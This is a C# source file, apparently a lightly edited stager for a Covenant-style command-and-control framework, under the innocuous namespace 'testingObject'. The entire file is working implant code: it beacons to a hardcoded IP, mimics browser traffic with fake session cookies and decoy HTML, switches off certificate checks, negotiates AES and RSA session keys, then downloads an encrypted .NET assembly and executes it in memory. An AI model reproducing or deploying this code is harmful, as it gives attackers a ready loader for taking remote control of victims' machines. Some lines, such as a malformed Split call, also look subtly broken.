using System;
using System.Net;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.IO.Pipes;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace testingObject
{
    public class testingObject
    {
        public testingObject()
        {
            execME();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new testingObject();
        }
        public static void Execute()
        {
            new testingObject();
        }
        public void execME()
        {
            try
            {
                List<string> myURIs = new List<string> { "http://192.168.252.114:80" };
                string CertHash = @"";
				List<string> ProfileHttpHeaderNames = @"User-Agent,Cookies".Split(',').ToList();
				List<string> ProfileHttpHeaderValues = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36,,ASPSESSIONID={GUID}; SESSIONID=1552332971750".Split(',,').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
				List<string> ProfileHttpUrls = @"/en-us/index.html,/en-us/docs.html,/en-us/test.html".Split(',').ToList();
				string ProfileHttpPostRequest = @"i=a19ea23062db990386a3a478cb89d52e&data={0}&session=75db-99b1-25fe4e9afbe58696-320bea73".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"<html>
    <head>
        <title>Hello World!</title>
    </head>
    <body>
        <p>Hello World!</p>
        // Hello World! {0}
    </body>
</html>".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"false");
                bool UseCertPinning = bool.Parse(@"false");

                Random random = new Random();
                string aGUID = @"ccfc3b4986";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"AHHGYhY9fzjo2TnFFx/quinMuPAmFBa1awFHSQNNwDA="); //Left out due to errors
                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes SetupAESKey = Aes.Create();
                SetupAESKey.Mode = CipherMode.CBC;
                SetupAESKey.Padding = PaddingMode.PKCS7;
                SetupAESKey.Key = SetupKeyBytes;
                SetupAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
                ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
                {
                    bool valid = true;
                    if (UseCertPinning && CertHash != "")
                    {
                        valid = cert.GetCertHashString() == CertHash;
                    }
                    if (valid && ValidateCert)
                    {
                        valid = errors == System.Net.Security.SslPolicyErrors.None;
                    }
                    return valid;
                };
                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                CookieWebClient wc = null;
                string Stage0Response = "";
                wc = new CookieWebClient();
                wc.UseDefaultCredentials = true;
                wc.Proxy = WebRequest.DefaultWebProxy;
                wc.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
                string myURI = "";
                foreach (string uri in myURIs)
                {
                    try
                    {
                        for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", ""), ProfileHttpHeaderValues[i].Replace("{GUID}", "")); }
                        wc.DownloadString(uri + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""));
                        myURI = uri;
                    }
                    catch
                    {
                        continue;
                    }
                }
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
                Stage0Response = wc.UploadString(myURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string message64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SetupAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);

                Aes SessionKey = Aes.Create();
                SessionKey.Mode = CipherMode.CBC;
                SessionKey.Padding = PaddingMode.PKCS7;
                SessionKey.Key = FullyDecrypted;
                SessionKey.GenerateIV();
                hmac = new HMACSHA256(SessionKey.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncryptedChallenge1);

                string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));

                string Stage1Response = "";
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
                Stage1Response = wc.UploadString(myURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessionKey.GenerateIV();
                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncryptedChallenge2);

                string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));

                string Stage2Response = "";
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++) { wc.Headers.Set(ProfileHttpHeaderNames[i].Replace("{GUID}", GUID), ProfileHttpHeaderValues[i].Replace("{GUID}", GUID)); }
                Stage2Response = wc.UploadString(myURI + ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse)).Replace("\"", "");
                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                Assembly myAssembly = Assembly.Load(DecryptedAssembly);
                myAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { myURI, CertHash, GUID, SessionKey });
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message); }
        }

        public class CookieWebClient : WebClient
        {
            public CookieContainer CookieContainer { get; private set; }
            public CookieWebClient()
            {
                this.CookieContainer = new CookieContainer();
            }
            protected override WebRequest GetWebRequest(Uri address)
            {
                var request = base.GetWebRequest(address) as HttpWebRequest;
                if (request == null) return base.GetWebRequest(address);
                request.CookieContainer = CookieContainer;
                return request;
            }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        public static class MessageTransform
{
    public static string Transform(byte[] bytes)
    {
        return System.Convert.ToBase64String(bytes);
    }
    public static byte[] Invert(string str) {
        return System.Convert.FromBase64String(str);
    }
}

    }
}
